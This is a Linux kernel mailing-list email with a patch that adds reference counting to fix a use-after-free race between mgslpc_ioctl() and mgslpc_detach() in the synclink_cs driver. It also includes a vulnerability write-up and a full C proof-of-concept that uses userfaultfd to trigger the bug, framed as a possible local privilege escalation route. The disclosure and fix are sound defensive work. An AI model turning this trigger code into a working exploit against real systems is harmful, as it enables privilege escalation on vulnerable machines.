Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id BC9F35B6741
	for <lists+linux-kernel@lfdr.de>; Tue, 13 Sep 2022 07:20:34 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229804AbiIMFUa (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Tue, 13 Sep 2022 01:20:30 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56648 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229597AbiIMFU1 (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Tue, 13 Sep 2022 01:20:27 -0400
Received: from mail-pj1-x102a.google.com (mail-pj1-x102a.google.com [IPv6:2607:f8b0:4864:20::102a])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id ACD004DF17
        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:20:25 -0700 (PDT)
Received: by mail-pj1-x102a.google.com with SMTP id m3so10166274pjo.1
        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:20:25 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=content-disposition:mime-version:message-id:subject:cc:to:from:date
         :from:to:cc:subject:date;
        bh=d8BqwxCGc+kXQ1e7xluf36X8/bgdZP+Eoc81d6aXuy4=;
        b=ofT4fVigZr+7fMiBAH41MqqVG/1seC7x27jqQ8PVBYpB2wxuWsBL4MrunlTbeSa1eo
         pvl2Y+ffYXAqM6xyLRoMO7IdS/AUYerQ/+SapiNxAstSSlx7SaowKurrXTe2ZSIpF0xD
         ag+dlUxHgEU+pk3ZDaqiEhvv4dLsRaVwierXfVwRjUa3o6UZxPzUTedSw9GklUzxVlUt
         thzh09yI5Wbl7QmSPJexnpNg7+7mhS+INWXQAHqSODLK0/kvN1efNSkrbELZTe6vGKcb
         szBzI22oa9xLZREXwHcWrqgAkMfoQfmS3o8WyUqGsbHFJoRzPbeoMF2FQeT51j3PL8FA
         2/cA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=content-disposition:mime-version:message-id:subject:cc:to:from:date
         :x-gm-message-state:from:to:cc:subject:date;
        bh=d8BqwxCGc+kXQ1e7xluf36X8/bgdZP+Eoc81d6aXuy4=;
        b=PwGgS8IDkSMvCMsbnRRjsZSKiKWqh2fe5W1jplbBDGOO1e+7S6G5/gtQQGJnE+RlUu
         QoaiE7PdaIE3i5e7ove8xdPB7Knhfg3iFqlf5+8OzuI/MPljfPo1u5Qk5oIrPPQoswuF
         0n6BBmWfUmMRT5A4R+aY3G+82B6Vf2kmBfPIAXUq5/+fEtLRMW7XRVMDWhWEQJn0q15r
         75XhWUhhQr0fFr0u3h+6Oax3Kn1ZleAtHl/kU5iys0yAPKrtMOacOgjpVuIrQjo7FTwU
         zTtVR5CLrlS4INKei0MOI4BIH3E24ZiXsUaLzAUTFj1ix+Q2hFDpISqSnOSLjBAvRkRU
         qNFQ==
X-Gm-Message-State: ACgBeo2jOv6Utro57gezt1o1TRDHZij0biJSt9U+hbrx8PaKlWGHSpsn
        43nYGH7gibvJvwd70TQCA7A=
X-Google-Smtp-Source: AA6agR4OFdES3kwD6rimFqvsTjUhccvM7pRHy7ypddRBWcbnNv3rilCmxgQyk6L3hSzmyKT9y20S1A==
X-Received: by 2002:a17:902:f541:b0:176:e8f1:cd57 with SMTP id h1-20020a170902f54100b00176e8f1cd57mr28903925plf.8.1663046424923;
        Mon, 12 Sep 2022 22:20:24 -0700 (PDT)
Received: from ubuntu ([175.124.254.119])
        by smtp.gmail.com with ESMTPSA id j3-20020a170902da8300b001714e7608fdsm7150577plx.256.2022.09.12.22.20.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 12 Sep 2022 22:20:24 -0700 (PDT)
Date:   Mon, 12 Sep 2022 22:20:20 -0700
From:   Hyunwoo Kim <imv4bel@gmail.com>
To:     arnd@arndb.de, gregkh@linuxfoundation.org,
        ilpo.jarvinen@linux.intel.com
Cc:     linux-kernel@vger.kernel.org, imv4bel@gmail.com
Subject: [PATCH] pcmcia: synclink_cs: Fix use-after-free in mgslpc_ioctl()
Message-ID: <20220913052020.GA85241@ubuntu>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,T_SCC_BODY_TEXT_LINE
        autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

A race condition may occur if the user physically removes
the pcmcia device while calling ioctl() for this tty device node.

This is a race condition between the mgslpc_ioctl() function and
the mgslpc_detach() function, which may eventually result in UAF.

So, add a refcount check to mgslpc_detach() to free the structure
after the tty device node is close()d.

Signed-off-by: Hyunwoo Kim <imv4bel@gmail.com>
---
 drivers/char/pcmcia/synclink_cs.c | 29 +++++++++++++++++++++++++----
 1 file changed, 25 insertions(+), 4 deletions(-)

diff --git a/drivers/char/pcmcia/synclink_cs.c b/drivers/char/pcmcia/synclink_cs.c
index 8fc49b038372..cf0cb3d7a69c 100644
--- a/drivers/char/pcmcia/synclink_cs.c
+++ b/drivers/char/pcmcia/synclink_cs.c
@@ -216,7 +216,8 @@ typedef struct _mgslpc_info {
 
 	/* PCMCIA support */
 	struct pcmcia_device	*p_dev;
-	int		      stop;
+	int			stop;
+	struct kref		refcnt;
 
 	/* SPPP/Cisco HDLC device parts */
 	int netcount;
@@ -468,10 +469,21 @@ static void mgslpc_wait_until_sent(struct tty_struct *tty, int timeout);
 
 /* PCMCIA prototypes */
 
+static void mgslpc_delete(struct kref *kref);
 static int mgslpc_config(struct pcmcia_device *link);
 static void mgslpc_release(u_long arg);
 static void mgslpc_detach(struct pcmcia_device *p_dev);
 
+static void mgslpc_delete(struct kref *kref)
+{
+	MGSLPC_INFO *info = container_of(kref, MGSLPC_INFO, refcnt);
+	struct pcmcia_device *link = info->p_dev;
+
+	mgslpc_release((u_long)link);
+
+	mgslpc_remove_device(info);
+}
+
 /*
  * 1st function defined in .text section. Calling this function in
  * init_module() followed by a breakpoint allows a remote debugger
@@ -534,6 +546,7 @@ static int mgslpc_probe(struct pcmcia_device *link)
 	init_waitqueue_head(&info->event_wait_q);
 	spin_lock_init(&info->lock);
 	spin_lock_init(&info->netlock);
+	kref_init(&info->refcnt);
 	memcpy(&info->params,&default_params,sizeof(MGSL_PARAMS));
 	info->idle_mode = HDLC_TXIDLE_FLAGS;
 	info->imra_value = 0xffff;
@@ -620,13 +633,14 @@ static void mgslpc_release(u_long arg)
 
 static void mgslpc_detach(struct pcmcia_device *link)
 {
+	MGSLPC_INFO *info = link->priv;
+
 	if (debug_level >= DEBUG_LEVEL_INFO)
 		printk("mgslpc_detach(0x%p)\n", link);
 
-	((MGSLPC_INFO *)link->priv)->stop = 1;
-	mgslpc_release((u_long)link);
+	info->stop = 1;
 
-	mgslpc_remove_device((MGSLPC_INFO *)link->priv);
+	kref_put(&info->refcnt, mgslpc_delete);
 }
 
 static int mgslpc_suspend(struct pcmcia_device *link)
@@ -2341,10 +2355,13 @@ static void mgslpc_close(struct tty_struct *tty, struct file * filp)
 	
 	tty_port_close_end(port, tty);
 	tty_port_tty_set(port, NULL);
+
 cleanup:
 	if (debug_level >= DEBUG_LEVEL_INFO)
 		printk("%s(%d):mgslpc_close(%s) exit, count=%d\n", __FILE__, __LINE__,
 			tty->driver->name, port->count);
+
+	kref_put(&info->refcnt, mgslpc_delete);
 }
 
 /* Wait until the transmitter is empty.
@@ -2480,6 +2497,8 @@ static int mgslpc_open(struct tty_struct *tty, struct file * filp)
 	if (mgslpc_paranoia_check(info, tty->name, "mgslpc_open"))
 		return -ENODEV;
 
+	kref_get(&info->refcnt);
+
 	port = &info->port;
 	tty->driver_data = info;
 	tty_port_tty_set(port, tty);
@@ -2520,6 +2539,8 @@ static int mgslpc_open(struct tty_struct *tty, struct file * filp)
 	retval = 0;
 
 cleanup:
+	kref_put(&info->refcnt, mgslpc_delete);
+
 	return retval;
 }
 
-- 
2.25.1


Dear all,

I think I've probably found a race-condition-to-UAF vulnerability in
drivers/char/pcmcia/synclink_cs.c.
However, this device driver is a pcmcia_driver based driver.
I haven't been able to get this old pcmcia adapter/device.

If you don't mind, I'd like to ask the Linux kernel community to test if
this vulnerability actually triggers.


# Introduction
This vulnerability occurs in drivers/char/pcmcia/synclink_cs.c.

The cause of the vulnerability is a race condition between mgslpc_ioctl() and mgslpc_detach().

The attack vector is the "/dev/ttySLP0" device node.
And this device node becomes 0660 permission belonging to the dialout group due
to the following udev rules in Ubuntu etc:
```
50-udev-default.rules:25:KERNEL=="tty[A-Z]*[0-9]|ttymxc[0-9]*|pppox[0-9]*|ircomm[0-9]*|noz[0-9]*|rfcomm[0-9]*", GROUP="dialout"
```
This means that if this vulnerability actually occurs, a user belonging to the "dialout"
group could use this UAF read/write vulnerability as an LPE.


# Vulnerability
This race condition occurs between this driver's tty_operations - mgslpc_ioctl()
and pcmcia_driver - mgslpc_detach():
```
                cpu0                                                cpu1
       1. tty_ioctl()
          mgslpc_ioctl()
          get_stats()
          COPY_TO_USER()  <- userfaultfd set
                                                             2. mgslpc_detach()
                                                                mgslpc_remove_device()
                                                                kfree(info)
       3. COPY_TO_USER()  <- userfaultfd release, UAF
```

1. Call ioctl() in the thread that open()ed ttySLP0.
It stops at COPY_TO_USER() in get_stats() because you pass the userfaultfd(or FUSEfs)
set userspace address when calling ioctl().

2. Physically remove the PCMCIA device.
In this case, the pcmcia_driver's .remove callback, mgslpc_detach() is called
and "kfree(info);" is executed.
Here this "info" structure is the target of a UAF attack.

3. Release userfaultfd from the thread that called ioctl().
A UAF occurs that copies the freed info structure's value to the user.
Also, since UAF occurs in all cases of mgslpc_ioctl(), it can be used for LPE.


The test code is:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>

#include <linux/synclink.h>


#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4
#define UFFD_COUNT 1

#define die() do { \
	fprintf(stderr, "died in %s: %u\\n", __func__, __LINE__); \
	exit(EXIT_FAILURE); \
} while (0)


int fd;
int page_size;
int set1 = 0;
char *addr;


void set_affinity(unsigned long mask) {
	if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
		perror("pthread_setaffinity_np");
	}

	return;
}

static void *fault_handler_thread(void *arg) {
	static struct uffd_msg msg;
	long uffd;
	static char *page = NULL;
	struct uffdio_copy uffdio_copy;
	ssize_t nwrite;
	int qid;
	uintptr_t fault_addr;

	uffd = (long)arg;

	if (page == NULL) {
		page = mmap(NULL, page_size,
				PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (page == MAP_FAILED){
			perror("mmap");
			die();
		}
	}

	for (;;) {
		struct pollfd pollfd;
		int nwritey;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nwritey = poll(&pollfd, 1, -1);
		if (nwritey == -1) {
			perror("poll");
			die();
		}

		nwrite = read(uffd, &msg, sizeof(msg));
		if (nwrite == 0) {
			printf("EOF on userfaultfd!\n");
			die();
		}

		if (nwrite == -1) {
			perror("write");
			die();
		}

		if (msg.event != UFFD_EVENT_PAGEFAULT) {
			perror("Unexpected event on userfaultfd");
			die();
		}

		fault_addr = msg.arg.pagefault.address;

		if (fault_addr == (uintptr_t)addr) {

			printf("[step 3] ioctl ufd stuck  pid : %ld\n", syscall(SYS_gettid));

			while(!set1);

			memset(page, 0x42, page_size);

			uffdio_copy.src = (unsigned long)page;
			uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
			uffdio_copy.len = page_size;
			uffdio_copy.mode = 0;
			uffdio_copy.copy = 0;
			if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
				perror("fault_handler_thwrite() - ioctl-UFFDIO_COPY case 1");
				die();
			}
		}
	}
}

void set_userfaultfd(void) {
	long uffd[UFFD_COUNT];
	struct uffdio_api uffdio_api[UFFD_COUNT];
	struct uffdio_register uffdio_register;
	pthread_t pf_hdr[UFFD_COUNT];
	int p[UFFD_COUNT];
	unsigned int size;

	page_size = sysconf(_SC_PAGE_SIZE);
	size = page_size;

	addr = (char *)mmap(NULL,
			page_size * UFFD_COUNT,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0);

	/*   userfaultfd handler thwrites   */
	for (int i=0; i<UFFD_COUNT; i++) {
		uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
		if (uffd[i] == -1) {
			perror("syscall : userfaultfd");
			die();
		}

		uffdio_api[i].api = UFFD_API;
		uffdio_api[i].features = 0;
		if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
			perror("ioctl() : UFFDIO_API");
			die();
		}

		uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
		uffdio_register.range.len   = size;
		uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
		if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
			perror("ioctl() : UFFDIO_REGISTER");
			die();
		}

		p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
		if (p[i] != 0) {
			perror("pthread_create : page_fault_handler_thread");
			die();
		}
	}
}

void *synclink_ioctl(void) {
	int ret;

	printf("[step 2] ioctl before  pid : %ld\n", syscall(SYS_gettid));

	ret = ioctl(fd, MGSL_IOCGSTATS, addr);

	printf("[step 5] ioctl after ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));
}

void *synclink_remove(void) {
	int ret;
	char input[2];

	sleep(5);

	printf("Disconnect now (After disconnecting, type enter)\n");
	read(0, input, 1);
	printf("[step 4] disconnect pcmcia device\n");

	sleep(5);

	/*
	 *
	 * allocate a victim structure
	 *
	 */

	set1 = 1;
}

int main() {
	int p1, p2;
	int status1, status2;
	pthread_t hdr1, hdr2;

	set_userfaultfd();

	fd = open("/dev/ttySLP0", O_RDWR);
	printf("[step 1] open fd = %d  pid : %ld\n", fd, syscall(SYS_gettid));

	p1 = pthread_create(&hdr1, NULL, synclink_ioctl, (void *)NULL);
	if (p1 != 0) {
		perror("pthread_create 1");
		die();
	}

	p2 = pthread_create(&hdr2, NULL, synclink_remove, (void *)NULL);
	if (p2 != 0) {
		perror("pthread_create 2");
		die();
	}

	pthread_join(hdr1, (void **)&status1);
	pthread_join(hdr2, (void **)&status2);

	printf("done  pid : %ld\n", syscall(SYS_gettid));

	return 0;
}
```

If the vulnerability is actually triggered, applying the sent patch will fix it.

Best Regards,
Hyunwoo Kim.
